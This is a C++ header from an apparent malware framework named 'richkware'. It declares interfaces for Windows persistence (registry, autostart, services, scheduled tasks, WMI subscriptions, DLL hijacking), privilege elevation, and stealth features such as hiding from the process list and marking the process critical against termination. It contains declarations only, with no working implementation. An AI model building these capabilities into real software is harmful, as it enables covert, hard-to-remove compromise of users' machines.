#pragma once

#include "../core/types.hpp"
#include <string>
#include <memory>
#include <filesystem>

namespace richkware::system {

/**
 * @brief Persistence methods
 */
enum class PersistenceMethod {
    Registry,           // Windows registry
    Autostart,         // Autostart folder
    Service,           // Windows service
    ScheduledTask,     // Task scheduler
    WMI,              // WMI event subscription
    DLL_Hijacking     // DLL hijacking
};

/**
 * @brief Privilege levels
 */
enum class PrivilegeLevel {
    User,
    Administrator,
    System
};

/**
 * @brief Persistence manager interface
 */
class IPersistenceManager {
public:
    virtual ~IPersistenceManager() = default;
    
    /**
     * @brief Install persistence mechanism
     * @param method Persistence method to use
     * @param executable_path Path to executable
     * @return Result indicating success or failure
     */
    [[nodiscard]] virtual core::Result<void> install(
        PersistenceMethod method,
        const std::filesystem::path& executable_path) = 0;
    
    /**
     * @brief Remove persistence mechanism
     * @param method Persistence method to remove
     * @return Result indicating success or failure
     */
    [[nodiscard]] virtual core::Result<void> remove(PersistenceMethod method) = 0;
    
    /**
     * @brief Check if persistence is installed
     * @param method Persistence method to check
     * @return true if installed, false otherwise
     */
    [[nodiscard]] virtual bool is_installed(PersistenceMethod method) const = 0;
    
    /**
     * @brief Get supported persistence methods
     * @return Vector of supported methods
     */
    [[nodiscard]] virtual std::vector<PersistenceMethod> supported_methods() const = 0;
};

/**
 * @brief Persistence manager implementation
 */
class PersistenceManagerImpl : public IPersistenceManager {
public:
    explicit PersistenceManagerImpl(std::string app_name);
    ~PersistenceManagerImpl() override;
    
    // Non-copyable, movable
    PersistenceManagerImpl(const PersistenceManagerImpl&) = delete;
    PersistenceManagerImpl& operator=(const PersistenceManagerImpl&) = delete;
    PersistenceManagerImpl(PersistenceManagerImpl&&) = default;
    PersistenceManagerImpl& operator=(PersistenceManagerImpl&&) = default;
    
    [[nodiscard]] core::Result<void> install(
        PersistenceMethod method,
        const std::filesystem::path& executable_path) override;
    
    [[nodiscard]] core::Result<void> remove(PersistenceMethod method) override;
    
    [[nodiscard]] bool is_installed(PersistenceMethod method) const override;
    
    [[nodiscard]] std::vector<PersistenceMethod> supported_methods() const override;

private:
    class Impl;
    std::unique_ptr<Impl> pimpl_;
};

/**
 * @brief Privilege manager for elevation and checks
 */
class PrivilegeManager {
public:
    PrivilegeManager();
    ~PrivilegeManager();
    
    // Non-copyable, movable
    PrivilegeManager(const PrivilegeManager&) = delete;
    PrivilegeManager& operator=(const PrivilegeManager&) = delete;
    PrivilegeManager(PrivilegeManager&&) = default;
    PrivilegeManager& operator=(PrivilegeManager&&) = default;
    
    /**
     * @brief Get current privilege level
     * @return Current privilege level
     */
    [[nodiscard]] PrivilegeLevel current_level() const;
    
    /**
     * @brief Check if running as administrator
     * @return true if administrator, false otherwise
     */
    [[nodiscard]] bool is_administrator() const;
    
    /**
     * @brief Request privilege elevation
     * @param executable_path Path to executable to elevate
     * @return Result indicating success or failure
     */
    [[nodiscard]] core::Result<void> request_elevation(
        const std::filesystem::path& executable_path) const;
    
    /**
     * @brief Enable specific privilege
     * @param privilege_name Name of privilege to enable
     * @return Result indicating success or failure
     */
    [[nodiscard]] core::Result<void> enable_privilege(const std::string& privilege_name);
    
    /**
     * @brief Disable specific privilege
     * @param privilege_name Name of privilege to disable
     * @return Result indicating success or failure
     */
    [[nodiscard]] core::Result<void> disable_privilege(const std::string& privilege_name);

private:
    class Impl;
    std::unique_ptr<Impl> pimpl_;
};

/**
 * @brief Stealth manager for hiding presence
 */
class StealthManager {
public:
    StealthManager();
    ~StealthManager();
    
    // Non-copyable, movable
    StealthManager(const StealthManager&) = delete;
    StealthManager& operator=(const StealthManager&) = delete;
    StealthManager(StealthManager&&) = default;
    StealthManager& operator=(StealthManager&&) = default;
    
    /**
     * @brief Hide console window
     * @return Result indicating success or failure
     */
    [[nodiscard]] core::Result<void> hide_console();
    
    /**
     * @brief Show console window
     * @return Result indicating success or failure
     */
    [[nodiscard]] core::Result<void> show_console();
    
    /**
     * @brief Hide specific window
     * @param window_title Title of window to hide
     * @return Result indicating success or failure
     */
    [[nodiscard]] core::Result<void> hide_window(const std::string& window_title);
    
    /**
     * @brief Set process as critical (prevents termination)
     * @param critical Enable/disable critical process flag
     * @return Result indicating success or failure
     */
    [[nodiscard]] core::Result<void> set_critical_process(bool critical);
    
    /**
     * @brief Hide from process list (basic techniques)
     * @return Result indicating success or failure
     */
    [[nodiscard]] core::Result<void> hide_from_process_list();
    
    /**
     * @brief Unhide from process list
     * @return Result indicating success or failure
     */
    [[nodiscard]] core::Result<void> unhide_from_process_list();

private:
    class Impl;
    std::unique_ptr<Impl> pimpl_;
};

/**
 * @brief High-level persistence manager
 */
class PersistenceManager {
public:
    /**
     * @brief Construct with application name
     * @param app_name Application name for persistence
     */
    explicit PersistenceManager(std::string app_name);
    
    ~PersistenceManager();
    
    // Non-copyable, movable
    PersistenceManager(const PersistenceManager&) = delete;
    PersistenceManager& operator=(const PersistenceManager&) = delete;
    PersistenceManager(PersistenceManager&&) = default;
    PersistenceManager& operator=(PersistenceManager&&) = default;
    
    /**
     * @brief Initialize persistence manager
     * @return Result indicating success or failure
     */
    [[nodiscard]] core::Result<void> initialize();
    
    /**
     * @brief Install persistence with best available method
     * @return Result indicating success or failure
     */
    [[nodiscard]] core::Result<void> install_persistence();
    
    /**
     * @brief Remove all persistence mechanisms
     * @return Result indicating success or failure
     */
    [[nodiscard]] core::Result<void> remove_persistence();
    
    /**
     * @brief Check if any persistence is installed
     * @return true if persistence is installed, false otherwise
     */
    [[nodiscard]] bool has_persistence() const;
    
    /**
     * @brief Get privilege manager
     * @return Reference to privilege manager
     */
    [[nodiscard]] PrivilegeManager& privileges() noexcept;
    
    /**
     * @brief Get stealth manager
     * @return Reference to stealth manager
     */
    [[nodiscard]] StealthManager& stealth() noexcept;

private:
    class Impl;
    std::unique_ptr<Impl> pimpl_;
};

} // namespace richkware::system